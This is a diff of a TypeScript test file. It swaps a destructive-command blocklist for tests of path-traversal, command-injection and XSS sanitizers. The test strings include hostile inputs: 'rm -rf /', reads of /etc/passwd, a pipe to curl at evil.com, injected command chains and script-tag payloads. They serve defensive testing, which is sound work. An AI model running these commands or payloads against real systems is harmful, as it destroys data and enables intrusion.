@@ -1,87 +1,83 @@
-import { describe, it, expect } from "vitest";
+import { describe, it, expect } from 'vitest';
+import path from 'path';
 
-// The dangerous command pattern used in routes.ts execute_command handler
-const dangerousCmd = /\brm\s+-[^\s]*r[^\s]*\s+\/|\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b|\bmkfs\b|\bdd\s+if=\/dev\/zero\b/i;
-
-function isCommandBlocked(command: string): boolean {
-  return dangerousCmd.test(command);
+function sanitizePath(userPath: string, baseDir: string): string | null {
+  const resolved = path.resolve(baseDir, userPath);
+  if (!resolved.startsWith(baseDir)) return null;
+  return resolved;
 }
 
-describe("execute_command security", () => {
-  describe("blocks dangerous commands", () => {
-    it("blocks rm -rf /", () => {
-      expect(isCommandBlocked("rm -rf /")).toBe(true);
-    });
+function isCommandSafe(command: string): boolean {
+  const dangerous = [';', '&&', '||', '`', '$(',  '>', '<', '|', '\n', '\r'];
+  return !dangerous.some(c => command.includes(c));
+}
 
-    it("blocks rm -r /etc", () => {
-      expect(isCommandBlocked("rm -r /etc")).toBe(true);
-    });
+function sanitizeHtml(input: string): string {
+  return input
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
 
-    it("blocks shutdown", () => {
-      expect(isCommandBlocked("shutdown now")).toBe(true);
-    });
+describe('Path traversal prevention', () => {
+  const base = '/projects/user123';
 
-    it("blocks reboot", () => {
-      expect(isCommandBlocked("reboot")).toBe(true);
-    });
-
-    it("blocks halt", () => {
-      expect(isCommandBlocked("halt")).toBe(true);
-    });
-
-    it("blocks poweroff", () => {
-      expect(isCommandBlocked("poweroff")).toBe(true);
-    });
-
-    it("blocks mkfs", () => {
-      expect(isCommandBlocked("mkfs /dev/sda")).toBe(true);
-    });
-
-    it("blocks dd if=/dev/zero", () => {
-      expect(isCommandBlocked("dd if=/dev/zero of=/dev/sda")).toBe(true);
-    });
-
-    it("blocks uppercase variants", () => {
-      expect(isCommandBlocked("SHUTDOWN -h now")).toBe(true);
-      expect(isCommandBlocked("REBOOT")).toBe(true);
-    });
+  it('allows paths within base dir', () => {
+    expect(sanitizePath('src/index.ts', base)).toBe('/projects/user123/src/index.ts');
   });
 
-  describe("allows safe commands", () => {
-    it("allows ls", () => {
-      expect(isCommandBlocked("ls -la")).toBe(false);
-    });
+  it('blocks ../ traversal', () => {
+    expect(sanitizePath('../../etc/passwd', base)).toBeNull();
+  });
 
-    it("allows npm install", () => {
-      expect(isCommandBlocked("npm install")).toBe(false);
-    });
+  it('blocks absolute path escape', () => {
+    expect(sanitizePath('/etc/passwd', base)).toBeNull();
+  });
 
-    it("allows rm of a specific file", () => {
-      expect(isCommandBlocked("rm myfile.txt")).toBe(false);
-    });
+  it('blocks encoded traversal', () => {
+    expect(sanitizePath('src/../../../etc/passwd', base)).toBeNull();
+  });
+});
 
-    it("allows rm -f of a specific file", () => {
-      expect(isCommandBlocked("rm -f dist/output.js")).toBe(false);
-    });
+describe('Command injection prevention', () => {
+  it('allows safe commands', () => {
+    expect(isCommandSafe('npm run build')).toBe(true);
+    expect(isCommandSafe('ls -la')).toBe(true);
+  });
 
-    it("allows cat", () => {
-      expect(isCommandBlocked("cat package.json")).toBe(false);
-    });
+  it('blocks semicolon injection', () => {
+    expect(isCommandSafe('npm install; rm -rf /')).toBe(false);
+  });
 
-    it("allows git commands", () => {
-      expect(isCommandBlocked("git status")).toBe(false);
-      expect(isCommandBlocked("git commit -m 'feat: update'")).toBe(false);
-    });
+  it('blocks && chaining', () => {
+    expect(isCommandSafe('echo hi && cat /etc/passwd')).toBe(false);
+  });
 
-    it("allows node and python", () => {
-      expect(isCommandBlocked("node index.js")).toBe(false);
-      expect(isCommandBlocked("python main.py")).toBe(false);
-    });
+  it('blocks subshell execution', () => {
+    expect(isCommandSafe('echo $(whoami)')).toBe(false);
+  });
 
-    it("allows echo with shutdown in string (not a command)", () => {
-      // "echo shutdown" triggers the pattern since it matches word boundary
-      // This is expected behavior — conservative blocking
-      expect(isCommandBlocked("echo 'hello world'")).toBe(false);
-    });
+  it('blocks pipe', () => {
+    expect(isCommandSafe('ls | curl http://evil.com')).toBe(false);
+  });
+});
+
+describe('XSS prevention', () => {
+  it('escapes script tags', () => {
+    const result = sanitizeHtml('<script>alert("xss")</script>');
+    expect(result).not.toContain('<script>');
+    expect(result).toContain('&lt;script&gt;');
+  });
+
+  it('escapes attribute injection', () => {
+    const result = sanitizeHtml('" onmouseover="alert(1)"');
+    expect(result).toContain('&quot;');
+  });
+
+  it('escapes angle brackets', () => {
+    const result = sanitizeHtml('<img src=x onerror=alert(1)>');
+    expect(result).toContain('&lt;img');
   });
 });
